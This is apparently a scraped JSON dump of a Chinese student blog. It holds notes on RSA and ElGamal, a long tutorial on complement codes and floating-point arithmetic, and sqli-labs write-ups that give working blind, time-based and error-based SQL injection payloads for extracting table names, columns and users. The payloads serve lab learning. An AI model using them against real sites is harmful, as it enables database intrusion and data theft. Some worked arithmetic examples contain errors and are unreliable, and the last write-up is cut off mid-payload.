单密钥体制进行密钥分配时，要求通信双方已经拥有一个共享的密钥（常常用人工方式传送双方共享的密钥，成本很高并且完全依赖信使的可靠性），或者依靠一个密钥分配中心（完全依赖于密钥分配中心的可靠性） 数字签名问题 对称加密算法难以实现抗抵赖的安全需求（抗抵赖：发送者过后不能否认他发送的信息） 与对称加密的比较 对称加密的优缺点 优点：速度快、多种算法且算法公开、计算量小、加密效率高、密钥长度相对较短（为了加密效率）等 缺点：接收方和发送方密钥需要一致，密钥难以保密传递；数字签名问题；每次使用对称加密时，都要使用他人没用过的密钥加密，这样就会产生大量的密钥，难以管理 非对称（公钥）加密的优缺点 优点：只有公钥时公开的，用户只要保存自己的私钥即可，一个用户一个密钥，方便管理，而且私钥公钥可以长时间不变也不用担心被破解。 缺点：加密和解密速度比对称密码慢，密钥长度相对较长 RSA算法 RSA算法是迄今为止理论上最为成熟完善的公钥密码体制。 密钥产生 选两个保密的大素数p和q 计算 n = p × q，φ(n) = (p-1) × (q-1)，后者是前者的欧拉函数值 选择一个整数e，e要满足 1 &lt; e &lt; φ(n)， 且gcd( φ(n),，e) = 1；gcd是最大公约数 计算d ， d × e = 1 mod φ(n)， d 就是e早mod φ(n)的逆元。 逆元这样求：本题中 e就是7 26 ÷ 7 = 3 ········ 8 7 ÷ 5 = 1 ········ 2 5 ÷ 2 = 2 ········ 1 往回倒的时候要注意 1 = 2 - 1 上一步的余数是1，要把1换成5 - 2 × 2 1 = 5 - 3 × 2 然后上一步的余数是2，所以要把2替换了成 7 - 5 ​ 1 = 4 × 5 - 7 × 3 ​ 然后 ​ 以{e，n}为公开密钥，{d，n}为秘密密钥。 加密过程 密文C、明文M ​ C = $M^e$ mod n 解密 M = $C^d$ mod n 练习 设通信双方使用RSA加密体制，接收方公开密钥{e，n} = {5，35}，密文C = 10，求明文M 解： n = 35 = 5 × 7 ；∴φ(n) = 4 × 6 = 24 ∵ d × e = 1 mod φ(n)；∴ 5d = 1 mod 24，得 d = 5 M = $10^5$ mod 35 = 5 ElGamal公钥密码体制 密钥产生 选取一个大素数p， g是一个小于p大于0得整数，叫做本原元，本原根，或者生成元。 用户选择随机整数x作为秘密密钥，x大于等于2，小于等于p-2； 公开密钥y = $g^x$ mod p 加密过程 明文M，密文C； C = (C1，C2)； C1 = $g^k$ mod p ； C2 = $m × y^k$ mod p 解密 C = (C1，C2) M = C2 × ${（{C1}^x）}^{-1}$ (mod p) 椭圆曲线密码","categories":[],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://c4stle.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"RSA，公钥密码","slug":"RSA，公钥密码","permalink":"https://c4stle.github.io/tags/RSA%EF%BC%8C%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81/"}]},{"title":"sqli-labs-8~10","slug":"sqli-labs-8~10","date":"2020-10-01T11:42:20.109Z","updated":"2020-04-03T16:29:39.824Z","comments":true,"path":"2020/10/01/sqli-labs-8~10/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-8~10/","excerpt":"","text":"盲注 ​ 盲注是注入攻击的一种，向数据库发送true或false的问题，并根据应用程序返回的信息判断结果，这种攻击的出现是因为应用程序配置为只显示常规错误，并没有解决sql注入存在的代码问题 盲注基本上都要一个一个字的猜解，非常的繁琐，需要有耐心！！ 什么时候用盲注 ​ 数据库不返回输出数据到web页面。啥也不知道，像you are in 和 提示错误但不显示错误新的页面。 sqli-labs-8 GET-基于布尔的盲注 #### 会用到的函数： length()：返回字符串的长度 substr()：substr(database(),2,1)，database的第二个字符开始取1位，就是取第二个字符 ascii()：返回内容的ascii码 and 和 or：id这样确定参数的用and；账号密码这样的用 or。 ?id=1 返回正常，加单引号异常回显。判断单引号闭合。and 1=1正常，and1=2 错误 数据库名称，payload： Codeand (select ascii(substr(database(),1,1))) &gt; 97 --+ 用二分法猜就好了 将database()位置改成查询语句 payload Code?id&#x3D;1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1),1,1))) &gt; 97 --+ 注意要括号起来 limit x,1中x的值就是第几个查询返回结果。 有点多就不继续了。太麻烦了！！！！！！😵😵😵😵😵😵😵😵😵 简便的放法可以用burp，取连接里的值遍历ascii码表。还有sqlmap直接跑！手注弄这么累干嘛嘞。我还要肝动森呢！！！！！！ sqli-labs-9 GET-基于时间的盲注 会用到的函数 slepp()：睡觉函数，查询时睡一会儿再返回结果 3.28继续写了起来，时隔五天，终于想起来自己还有个博客要更新 动森实在是太好了。。。。朋友圈也是被刷屏，然而都是别人的朋友圈，我只能一个人肝，没有门可以串，想要的水果鲜花服装家具都只能自己来- -。 然而一个人的力量还是不够啊！！！很多东西都肝不到，所以开始佛系了(才怪！ if(a,b,c)：if语句，如果a为真，返回b；如果a为假，返回c eg. if(ascii(substr(select xxx from xxx where xxx limit 0,1)) = 1,1,sleep(5)) 打开第九题页面，发现我们不管输入什么都显示you are in 用sleep函数判断闭合符号F12➡网络。 换成双引号 判断数据库长度、名称 长度大于睡眠五秒，长度大于7秒进，判断为8位数。 ascii(substr())判断名称, payload： Code?id&#x3D;1 and if(ascii(substr(database(),1,1)) &#x3D; 115,1,sleep(5)) --+ 判断出来数据库为security 判读表名，这里可以先做一步判断表数量的语句 if ((select cout(tables) = 1),1,sleep(5)) payload： 做的时候中间括号少了一个，找的我眼睛快花了 Codeand if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &gt; 10 ,1,sleep(5)) --+ 查到表名为emails，referers，uagents，users 判断列数，列名。 列数判断同上 if ((select cout(column) = 1),1,sleep(5)) payload： Codeand if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1)) &gt; 10 ,1,sleep(5)) --+ 找到列名三个为，id，username，password 判断列值的内容及长度。 判断列长 if ((select length(username)= 1),1,sleep(5)) payload： Codeand if(ascii(substr((select username from security.users limit 0,1),1,1)) &lt; 10 ,1,sleep(5)) --+ 判断列值的时候最好在列名前加上库的名字，避免相同列名不同库导致的错误 sqli-labs-10 同9，但是是双引号闭合。 写在最后 动森真好玩！ 今天空间看到下面这张图，我陷入了沉思。。。。 确实是这样，但是我的内心是想学习的！动森也必须玩，那肯定给舍弃睡觉啊！！！ 早上学习，深夜玩如何？","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://c4stle.github.io/categories/sqli-labs/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://c4stle.github.io/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"原码、反码、补码。。。","slug":"原码、反码、补码。。。","date":"2020-10-01T11:42:20.109Z","updated":"2020-05-14T12:39:40.001Z","comments":true,"path":"2020/10/01/原码、反码、补码。。。/","link":"","permalink":"https://c4stle.github.io/2020/10/01/%E5%8E%9F%E7%A0%81%E3%80%81%E5%8F%8D%E7%A0%81%E3%80%81%E8%A1%A5%E7%A0%81%E3%80%82%E3%80%82%E3%80%82/","excerpt":"","text":"机器数 一个数值在以二进制的形式存放在计算机中。这个二进制就叫做这个数值的机器数。 比如 Code5的机器数就是 0000 0101-5的机器数就是 1000 0101 机器数的要表现形式为原码、补码和反码。上面这个就是正负5的原码表示 机器数 不等于 原码！！！ 真值 因为第一位要作为符号位来区分正负。 比如 Code机器数的形式值1000 0101 &#x3D; 133机器数的真值 1000 0101 &#x3D; +5 所以，为了区别，将带符号位的机器数对应的真正数值称为机器数的真值 机器数的原码表示法 整数和小数转换为原码 机器数的原码形式就是 符号位 + 剩余位表示值 比如 整数的原码： ${[+5]}_原$ = 0000 0101 = 0,0000101 ${[-5]}_原$ = 1000 0101 = 1,0000101 直接把第一位改成符号位即可 用逗号将符号位和数值部分分隔开 因为第一位是符号位，所以8位二进制数的取值范围就是 [1，1111111 ~ 0，1111111] = [-127，127] 这也是我们最容易理解的方式了 小数的原码： 小数的二进制： 0.000 0000，小数点后的从左往右分别表示为 $2^{-1}$、$2^{-2}$、$2^{-3}$ … $2^{-7}$ 小数原码的计算公式为 ${[+0.5]}_原$ = ${[0.100]}_原$ = +0.100 0000 = 0.100 0000 ${[-0.5]}_原$ = ${[-0.100]}_原$ = -0.100 0000 = 1 - ( -0.100 0000 ) = 1. 100 0000 正小数的原码等于本身：+0.xxxx = 0.xxxx 负小数的原码等于符号位取反：-0.xxxx = 1.xxxx 用小数点将符号位和数值位分隔开 0的原码 0先看整数还是小数，主要是逗号和小数点的区别 Code+0 &#x3D; 0，000-0 &#x3D; 1，000+0.000 &#x3D; 0.000-0.000 &#x3D; 1.000 还是比较容易理解的 已知原码求真值 ${[x]}_原$ = 1.0011，求x 思考：易得，x是个负小数，回想公式${[x]}_原$ = 1 - x Code解(1)： x &#x3D; 1 - 1.0011 &#x3D; -0.0011解(2)： 直接改 符号位-0 原码的特点 简单、直观。 但是用原码作加法的时候，会出现以下问题 直接截的慕课哈工大的《计算机组成原理(下)》上的图 正数和负数做加法的时候实际会变成减法。 如何才能只做加法？ 对负数使用补码。 机器数的补码表示法 整数补码的求法 正数的补码 带符号的二进制是数、用0、1表示的码 -0101的补数是+1011，补码是0，1011 正数的补码就是其本身。 Code0.100 &#x3D; 0.1000,0101 &#x3D; 0,0101 负数的补码 所有位取反然后+1 Code-0101 &#x3D; 1，0101，补码为 0，1010 + 1 &#x3D; 0，1011 &#x3D; +1011 整数补码的公式，n表示x的位数 这边涉及到二进制的减法。 比如x = -1011000 ${[x]_补}$ = $2^{7+1}$ + ( -1011000 ) 用我们学的大数减小数对我来说有点复杂难懂，所以我反其道而行之。用加法。从末尾开始用加法把结果推出来 1+1 = 0 进 1。 已知负数真值，口算补码： 除了符号位的1，每位取反、末位+1即可 -1010 = 1，1010 除了符号位，所有位取反+1 = 1，0110 小数补码求法 跟整数差不多，看图 举两个例子 Code+0.101 &#x3D; 0.101-0.101 &#x3D; 10.000 + (-0.101) &#x3D; 1.111 + 1 - 0.101&#x3D; 1.011 0的补码 ${[+0]}_补$ = 0000 0000 |${[-0]}_补$ = 0000 0000 = 1111 1111 + 1 = 1 0000 0000 ，因为符号位只有1位，最前面的1要丢掉 所以0的补码就只有0！ 已知补码求真值 ${[x]}_补$ = 0.0001，求x ​ 解： x = 0.0001 ${[x]}_补$ = 1.0001 ​ 解： x = ${[x]}_补$ - 2 = -0.1111 或者 先-1，然后除符号位全部取反得： 1.1111 = -0.1111 补码特点 可以把减法变成加法！这很重要，补码本质。 机器数的反码表示法 整数反码的求法 公式： 其实就是 正数反码等于本身 x = +1101，${[x]}_反$ = 0，1101 负数反码等于 除了符号位，所有位取反 x = -1101，${[x]}_反$ = 1，0010 小数反码的求法 公式： 正数小数反码等于本身 x = +0.1101，${[x]}_反$ = 0.1101 负数小数反码等于 除了符号位，所有位取反 x = -0.1010，${[x]}_反$ = 1.0101 0的反码求法 +0 = 0000 0000 -0 = 1111 1111 负数才要取反、负数才要取反、负数才要取反 已知反码求真值 ${[x]}_反$ = 0，1110，求x ​ 解：x = +1110 ${[x]}_反$ = 1，1110，求x ​ 解：x = -0001 正数照抄，负数取反 原码、补码、反码的小结 最高位为符号位。书写上，整数用逗号隔开符号位和数值位，小数用小数点隔开符号位和数值位 正数，符号位为0，原码 = 补码 = 反码 负数，符号位为1。原码： 符号位为1，其他不变；补码：符号位为1，数值为依次取反后 + 1；反码：符号位为1，数值为依次取反，不+1 已知${[y]_补}$，求${[-y]_补}$：${[y]_补}$包括符号位在内，依次取反，末位+1，得到${[-y]_补}$ 机器数的移码表示法 为什么要用移码表示法？ 因为补码很难直接判断其真值得大小 比如 Codex&#x3D;+21 对应的二进制是+10101 补码是0，10101x&#x3D;-21 对应的二进制是-10101 补码是1，01011我们人知道第一位是符号位，所以可以判断很容易判断大小；但是在计算机里没有逗号，去掉了逗号，-21的二进制是比+21的二进制大的 移码定义： 整数移码的求法 正数的移码就是：把符号位的0变成1 负数的移码就是：包括符号位在内，所有位取反并且末位+1 跟自身的补码就差一个符号位取反！ 小数没有移码：因为移码通常用来表示浮点数据的阶码部分，阶码都是整数 移码的特点 移码全为0时，对应的真值是最小值为$-2^n$ 移码全为1时，对应的真值是最大值为$2^n-1$ 问为什么的可以看看移码定义，看看取值范围。 数的表示 定点表示 小数点总固定在某一位置 通常数据为纯整数或纯小数 浮点表示 为什么要引入浮点数表示 编程困难，程序员要调整小数点位置 数的表示范围小，为了能表示两个大小相差很大的数据，需要很长的机器字节（如果用定点表示的话） 对于N = S × $r^j$， S是尾数，j是阶码，r是尾数的基数；S、j都是以二进制表示，S是小数，可正可负；j是整数，可正可负；r取2、4、6、8等， 当r = 2 ， N = 11.0101 时 ​ = 0.110101 × $2^{10} ​ = 1.10101 × $2^1$ 浮点数的表示形式 这是在浮点机中的表现形式。 阶码的小数点在最后，尾数的小数点在符号位的后面。一个整数一个小数。 浮点数的表示范围 最大正数和最小负数差个负号、最小正数和最大负数同理~ 上溢：阶码 &gt; 最大阶码 下溢：阶码 &lt; 最小阶码 按机器零处理 练习 设机器数字长为24位，与表示正负3万的十进制数，试问在保证数的最大精度的前提下，除阶符、数符、各取1位外。阶码、尾数各取几位？ ​ 解：$2^{14}$ = 16384 、$2^{15}$=32768 ​ 所以15就是确定下来阶码的十进制数，但是转换成二进制数可以转换为4位、5位、6位… 因为取4位二进制最大是15、5位是32、6位是64、都能够表示正负3w个十进制数 但是要保证最大精度，所以尾数精度要打，占的尾数要多。 所以，阶码4位，尾数24-1-1-4 = 18位 浮点数的规格化形式 规格化步骤 直到数符和第一位数不同为止 尾数是00. 或 11. 的用左规，阶码减1 尾数是01. 或 10. 的，说明移除了，需要右规，阶码加1 基数r越大，能表示的浮点数范围越大、浮点数精度越低。 例如： 设m=4，n=10，r=2 尾数规格化后的浮点数表示范围 最大正数为：$2^{+1111}$ × 0.11111 11111 = $2^{15}$ × ($1-2^{-10}$) 最小正数为：$2^{-1111}$ × 0.10000 00000 = $2^{-15}$ × ($2^{-1}$) = $2^{-16}$ 最大负数为：$2^{-1111}$ × ( -0.10000 00000) = $-2^{15}$ × ($2^{-1}$) 最小负数为：$2^{+1111}$ × ( -0.11111 1111) = $-2^{15}$ × ($1-2^{-10}$) 规格化数的特例： 补码如果是规格化数，符号位不能和数值位最高位相同 练习 将+$9/128$写成二进制定点数、浮点数及在定点机和浮点机中的机器数形式。其中数值部分均取10位，数符取1位，浮点数阶码取5位（含1位阶符），尾数规格化 ​ 解： 19 = 16+2+1 = 10011、1/128 = $2^{-7}$ 所以 x = 0.0010011 因为题目让数值部分取10位，所以补三个0； 定点表示：x=0.0010011 000 浮点规格化形式： x = ${0.1001100000}×2^{-10}$ 顶点机中：原码 = 补码 = 反码 = 0.0010011000 浮点机中： $x_原$ = 1，0010；0.1001100000 分号前是阶码 $x_补$ = 1，1110；0.1001100000 $x_反$ = 1，1101；0.1001100000 还是练习 将-58表示成二进制定点数和浮点数，并写出它在定点机和浮点机中的三种机器数及阶码为移码、尾数为补码的形式。其中数值部分均取10位，数符取1位，浮点数阶码取5位（含1位阶符），尾数规格化 解：-58 = -（32 +16 + 8 + 2） =-111010 定点表示(变成10位) x = -0000 111010上一题是小数，在末尾加0。整数要在前面加（因为溢出了，右规） 浮点规格化形式：x = $（ -{0.111010} ）×2^{110}$ 定点机中： $x_原$ = 1，0000111010 $x_补$ = 1，1111000110 $x_反$ = 1，1111000101 浮点机中： $x_原$ = 0，0110；1.1110100000 $x_补$ = 0，0110；1.0001100000 $x_反$ = 0，0110；1.0001011111 $x_{阶移、尾补}$ = 1，0110；1.0001100000 两道练习的总结 如何规格化浮点数： 如果是小数，补0在末尾补；小数点是在最前面的，所以规格化要乘$2^(j)$，阶码j是负的二进制数（左规） 如果是整数，在二进制的最前面补0；小数点在最后的，所以要乘$2^(j)$，阶码j是正的二进制数（右规） 不管是阶码还是尾数，都只有是负数的时候才要考虑补码和反码。 尾数补上的0，在变换补码、反码的时候要一起变换。 机器零 当浮点数尾数(S)为0时，不论其阶码为何值，按机器零处理 当浮点数阶码等于或小于它所表示的最小数时（看“浮点数表示范围”那一节），不论尾数为何止，按机器零处理 当阶码和尾数都用补码表示时; 机器零为：x，xxxx；0.00…0 1，000；x.xxxx…x 当阶码用移码，尾数用补码表示时，机器零 0，0000；0.000…000 （阶码为零或者补码为零） IEEE754标准 因为规格化了，所以尾数最高位的1 隐含了，这样就多了一个位置给尾数 定点运算 1. 移位运算 机器里面妹有小数点儿，所以左移右移的对象是数字 算术移位规则 符号位都不动，只有数值位移 练习 机器数字长8位（含1位符号位），写出A=+26时，三种机器数左、右移一位和两位后的表示形式及对应的真值，并分析结果的正确性 ​ 解：A = +26 = 0，0011010 原码、补码、反码都是0，0011010 左移太多最高位丢1，结果就出错。 右移太多最低为丢1，影响精度 A = -26的时候呢？ ​ 解： 负数要分原码、补码、反码了哦 原码：A = -26 = 1，0011010 补码：A = 1，1100110 反码： A = 1，1100101 ，负数的反码补的是1！ 算数位移和逻辑位移的区别 2. 加减法运算 在计算机中，大部分的减法的结果都是用补码相加来得到的 在加减法的时候要连同符号位一起运算。 （1）加法 A + B可以直接相差求，用来验证一下 举例：设A = 0.1011，B=-0.0101，求$[A+B]}_补$ ​ 解： ​ $[A_补]$ = 0.1011； ​ $[B_补]$ = 1.1011； ​ 相加得到 10.0110 = $[{A+B}_补]$ A+B的补码的符号位舍弃掉多余的进位，得到的结果是A+B的值 ​ A+B = 0.0110 举例：设A = -9，B = -5，求$[A+B]}_补$ ​ 解： ​ $[A]_补$ = 1，0111； ​ $[B]_补$ = 1，1011； ​ 相加得到 11，0010 = $[A+B]_补$ A+B补码保留一位符号位，先减一再取反 ​ A + B = 1，0010 - 1 = 1，0001 = 1，1110 = -1110 出题不严谨，没考虑寄存器长度，没有设定符号位和数值位占的位数 （2）减法 举例：设机器数字长为8位（含1位符号位），且A = 15，B = 24，用补码求A - B ​ 解： ​ A = 0，0001111、B = 0，0011000 ​ $[A]_补$ = 0，0001111； ​ $[B]_补$ = 0，0011000； -B的补码 等于 B的补码 符号位及数值位依次取反后+1 ​ $[-B]_补$ = 1，1101000 相加得到${[A+(-B)]}_补$ = 1,1110111 ​ A - B = 1，0001001 = -1001 = -9 练习 设x = 9/16、y = 11/16机器数长为5位（1位为符号位），是个存小数的定点机。用补码求x+y； ​ 解： ​ x = 9/16 = 1/2 + 1/16 = 0.1001 = ​ y = 11/16 = 1/2 + 1/8 + 1/16 = 0.1011 ​ $[x+y]_补$ = 1.0100= -0.0100 ​ x + y = -0.1100 = -12/16 ？？？？ 正确答案：20/16；这里是超过了小数定点机的范围-1~（1-$2^5$)，答案数值溢出 练习 设机器数长为8位（含1位符号位），是整数型的定点机，且A = -97，B = +41，用补码求A -B ​ 解： ​ A = -97 = 1，1100001 ​ B = +41 = 0，0101001 ​ $[A_补]$ = 1，0011111 ​ $[B_补]$ = 0，0101001 ​ $[-B_补]$ = 1，1010111 $[{[A+(-B)]}_补]$ = 10，1110110，舍弃符号位的1 A - B = 0，1110110 = +118 ？？？？？ 正确答案：-138；机器数长为8为的定点机，一位符号位，范围在-128~127（补码没有-0，要往后+1，所以有-128），-138超过了溢出了 3. 溢出判断 符号不同俩数不可能会溢出 （1）一位符号位判溢出 如果两个数符号相同（如果是A - B，则要看-B的补，是否与A相同），加减法之后结果的符号与原操作数的符号不同，即为溢出 （2）两位符号位判溢出 双符号位相同，00或者11这样，就是未溢出1 双符号位不同，最高符号位，代表真正符号位。 11表示负数，就是1；00表示正数，就是0 双符号取反的话，符号位也要变，正负不变： 例子： 在整数定点机中，机器数采用补码，双符号位，若它的十六进制表示为C0H，则它的真值为（）。 C0H = 1100 0000，11表示负数，减一取反得 0100 0000 = 64，所以答案是-64 4. 乘法运算 例子 逻辑右移：符号位也要移。乘数右移要看一下是0还是1 是1的话，部分积要加上x的绝对值； 是0就加0。 5. 除法运算 （1）原码除法 第一步，商的符号单独处理，将x0、y0做异或处理 第二步，数值部分绝对数相除。 小数定点除法 x的绝对值$x^*$ &lt; y的绝对值 整数定点除法 x的绝对值 &gt; y的绝对值$y^*$ 被除数不等于0；除数不能为0 恢复余数法 例子： x = - 0.1011，y = - 0.1101，求x/y的原码 解： ​ x的原码 = 1.1011，y的原码 = 1.1101 ​ $y^*$的补码 = 0.1101； 因为计算时用的是绝对值。所以如果要做减法的话需要将绝对值加上负号，就是减绝对值，然后转换成补码来计算。 ​ $- y^*$的补码 = 1.0011； 第一步：计算符号位，两个数原码的符号位异或，结果是1 XOR 1 = 0，符号位是正值。 第二步：计算的时候用的是x和y绝对值的原码 做法： 最开始先 加上 -y绝对值的补码，判断结果。 ①. 如果是负数，上商为0。恢复原来的被除数（就是加上$y^*$的补码），逻辑左移，然后再加上 -y绝对值得补码，再判断余数正负； ②. 如果结果为整数，上商为1，直接逻辑左移，再加上 $- y^*$的补码，再判断余数正负； ③. 至于要逻辑左移几次，要看x和y的尾数。这题里x和y的尾数是 4 .所以要位移 4 次，上商 4 + 1次 不恢复余数法(加减交替法) 例子 x = -0.1011 y = -0.1101， 求x/y的原码 解： ​ x的原码 = 1.1011，y的原码 = 1.1101 ​ $y^*$ = 0.1101； ​ $-y^*$ = 1.0011； 第一步：计算符号位，两个数原码的符号位异或，结果是1 XOR 1 = 0，符号位是正值。 第二步： 做法： 先加 $-y^*$的补码 如果余数为负，上商0，逻辑左移，加 $y^*$的补码； 如果余数为正，上商1，逻辑左移，加 $-y^*$的补码； 特点： 上商 n+1次，第一次上商判溢出；移n次，加n+1次，可以用移位次数判断是否结束。 浮点四则运算 浮点数运算特点：符号位和尾数位是分开的。 浮点数的加减运算 x = $S_x$ · $2^{j_x}$； y = $S_y$ · $2^{j_y}$； （1）对阶 求阶差 阶码小的尾数左移，然后阶码 + 1。 阶码小的向阶码大的看齐，只损失精度，不损失大小，起码值对。 练习 例如：x = $0.1101 × 2^{01}$； ​ y = $( - 0.1010) × 2^{11}$； 求 x+y 解： 因为要进行溢出判断，所以选择用两位符号位表示；可以看溢出判断的例子 之后操作也都是用补码 ​ 首先 求 $[x]_补$ = 00，01；00.1101； $[y]_补$ = 00，11；00.0110； 一、对阶 求阶差： ​ ❎ 01 - 11 = -10，这是人的想法， 机器是用补码求的 对阶： 因为阶差是 -2 的，∴$S_x$ -&gt; 2，$j_x$ + 2 结果是 $[x]_补$ = 00，11；00.0011； 二、尾数求和 $[S_x]_补$ = 00.0011； $[S_y]_补$ = 11.0110； 所以答案为：00，11；11.1001，但是这不是最终结果，因为没有规格化，计算机里都是规格化数（提高精度）。 三、尾数规格化 基数r默认都是用2来规格化。 $[x+y]_补$ = 00，11；11.1001； 左规： 看分号后面的尾数，11.1001，符号位是11（双符号位）也就是1，数值位也是1，冲突了。 尾数左移，阶码减一，得${[x+y]}_补$ = 00，10；11.0010 x+y = $2^{10} × - (0.1110)$ 练习 x = 0.1101 × $2^{10}$； y = 0.1011 × $2^{01}$； 求 x+y（除阶符、数符外，阶码取3位，尾数取6位） 解： $[x]_补$ = 00，010；00.110100； $[y]_补$ = 00，001；00.101100； 对阶 00，010 + 11，111 = 100，001 = 00，001 = 1 &gt; 0 ∴ $S_y$ -&gt; 1 、$j_y$ + 1 ∴$[y]_补$ = 00，010；00.010110 尾数求和 $[S_x]_补$ = 00.110100； $[S_y]_补$ = 00.010110； 相加后得 $[S_{x+y}]_补 = $01.001010 规格化，是01，所以右规 双符号位，如果溢出，前面的是真的符号数，这题里是0 $[x+y]_补$： 00，010；01.001010 -&gt; 00，011；00.100101 ∴$[x+y]_原$ = 00，011，00.100101 x+y = 0.100101 × $2^{11}$ 浮点数的乘除运算 浮点运算溢出判断 最小负数：因为补码的0只有一个，所以从原码转过来的最小负数要-1，本来-1的原码变补码是11.11111111 -&gt; 11.00000001 ，要-1哦！ 最大负数：原码最大的负数，11.10000000，转补码就是11.10000000，但它不是规格化数，所以要-1取最近的值。 最小正数和最大正数自己品一下~ 最小负数和最大正数的位置位是互补的有没有！ 最大负数和最小整数也是互补的有没有 算术逻辑单元 ALU电路（算术逻辑单元电路）","categories":[],"tags":[{"name":"学习","slug":"学习","permalink":"https://c4stle.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"符号数","slug":"符号数","permalink":"https://c4stle.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%95%B0/"},{"name":"定点数和浮点数","slug":"定点数和浮点数","permalink":"https://c4stle.github.io/tags/%E5%AE%9A%E7%82%B9%E6%95%B0%E5%92%8C%E6%B5%AE%E7%82%B9%E6%95%B0/"}]},{"title":"sqli-labs-5~6","slug":"sqli-labs-5~6","date":"2020-10-01T11:42:20.093Z","updated":"2020-04-12T07:18:02.662Z","comments":true,"path":"2020/10/01/sqli-labs-5~6/","link":"","permalink":"https://c4stle.github.io/2020/10/01/sqli-labs-5~6/","excerpt":"","text":"sqli-lab5 ?id=1，看到回显跟之前有些不一样。 加入单引号，报错了，判断为字符型注入 加入注释，正常显示。and 1=1 正常显示；and 1=2，没报错，不显示。 order by 判断字段数为3，然后联合查询，前表要报错。 发现问题了，没有回显位置。这个时候就需要使用其他的注入方式了，这里我使用报错注入 报错注入前需要知道的一些MYSQL函数 第一种：updatexml、concat updatexml()：是mysql对xml文档数据进行查询和修改的xpath函数 语法：updatexml(xml_document,xpath_string,new_value) 第一个参数：filename是string格式，为表中的字段名 第二个参数：XPathstring（Xpath格式的字符串），xpath的定位必须是有效的，否则会报错 第三个参数：也是string格式，替换查找到的符合条件的东西。 第一个参数跟第三个参数都不重要， concat()：把两个参数合并起来一起返回！ 使用payload： Code?id&#x3D;-1&#39; and updatexml(1,version(),0) --+ 发现返回的版本号并不完全，这是因为updatexml最多返回32个字节，，，emmmm。。，所以需要concat函数来帮忙 payload： Code?id&#x3D;-1&#39; and updatexml(1,concat(0x2b,version(),0x2b),0) --+ 相同的操作，查询库名 查询表名，要注意查询语句需要括号括起来，不然会报错。 payload： Code?id&#x3D;-1&#39; and updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),0) --+ 但是又发现了问题，返回的结果多于一行，那咋办？改payload！ 第一个方法是像前面的题一样用group_concat()将table_name括号起来。 payload： Code?id&#x3D;-1&#39; and updatexml(1,concat(0x2b,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),0) --+ 第二个方法，语句最后加上 limit 0,1，然后一个一个输出。来自未来的吐槽，你偷懒我浪费时间！来自未来的补上的payload Codeand updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),0) --+ payload就不写了，直接加就好了。 limit 0,1 表示从第0个开始输出第一个！ 接下来就只要对select语句更改就可以了！ 值得注意的是，用group_concat是很轻松，但是有的时候返回的东西太长了，页面会显示不完全，比如： 还不是能偷懒呀！乖乖用limit 找吧不只是对这道题，updatexml拿去注入另一道ctf的题，也是返回不完全，导致flag只显示一半，难受死我了😫😫！也不知道是什么原因，暂时没有查到，以后要是知道了就更新一下 第二种：extractvalue extractvalue()：用来查询语句，跟第一个updatexml差不多 语法：extractvalue(xml_frag, xpath_expr) 第一个参数可以传入xml文档，第二个用xpath路径法表示。 我也不大懂，直接上payload好了。。 跟第一个差不多的payload： Code?id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+ 第三种：count、rand、floor、group by count()：聚合函数，也叫计数函数。用来记录表的行数 rand()：随机数字函数（0~1） floor()：取整函数（向下取整） group by caluse：分组语句，按照查询结果分组 (可以把一段话括号起来)x，这样x就等于括号里的话了, as x也是相同的作用 给出一个报错语句：select count(*) from table group by floor(rand(0)*2) 报错原因是因为floor(rand(0)*2) 的值是固定的，拿前五个来说是0110110，在使用count和group by一起使用的时候，floor(rand(0)*2)会执行一次，如果结果是0，就会再执行一次，如果是1，会将1插入一个虚拟表再执行一次。虚拟表中有key值和count(*)值 第一次查询为0，再执行一次； 第二次查询为1，放进表后再执行一次（key = 1，count(*) = 1）； 第三次查询为1，表中值+1，再执行一次（key = 1，count(*) = 1 + 1）； 第四次查询为0，再执行一次； 第五次查询为1，本来应该放进表中，但是mysql不会这么做，只想着重新插入一个值为1的数据，但是已经存在一个了，所以报错了。 所以只要在这个报错语句里写一个查询语句，就可以得到我们想要的数据了 给出一个基本payload：因为会建个虚拟表，所以可以union连接就好了 Codeselect count(*),concat((select语句写在这),0x2b,floor(rand(0)*2))x from information_schema.columns group by x 当中information_schema.columns也可以是.tables 因为次数起码要大于5次，才会报错！ count(*)起的是虚表中计数的作用。 报错注入 count(*)、floor()、 rand()、group by 缺一不可。 亲测，updatexml好用多了！！！！ 虚假的payload： Code?id&#x3D;-1&#39; union select count(*),concat((select database()),0x2b,floor(rand(0)*2))x from information_schema.columns group by x --+ 为啥没有想到的东西出来呢？ 废话！人家有三列，你就给人一个count(*)，一个那么长一段，还有1列被你吃啦？！@_@~~ 第一种写法 真实的payload：不写语句的时候concat里的select可以去掉。但是写了也没差！建议写！~ Code?id&#x3D;-1&#39; union select 1(或者用null都行),count(*),concat((select database()),0x2b,floor(rand(0)*2))x from information_schema.columns group by x --+ 这样就有了我们要的数据。其实concat((select database()),0x2b,floor(rand(0)*2))x可以直接去掉x写在group by的后面。不过要注意这样from的前面就变成逗号了，是会报错的！ 只要加上1列，让from 跟在一个东西后面就好了！ 修改concat中select语句爆表名：select语句记得括号！ Code?id&#x3D;1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema &#x3D; &#39;security&#39; limit 0,1),0x2b,floor(rand(0)*2))x from information_schema.columns group by x --+ 列名payload：这里用联合查询不需要报错？？ Code?id&#x3D;1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name 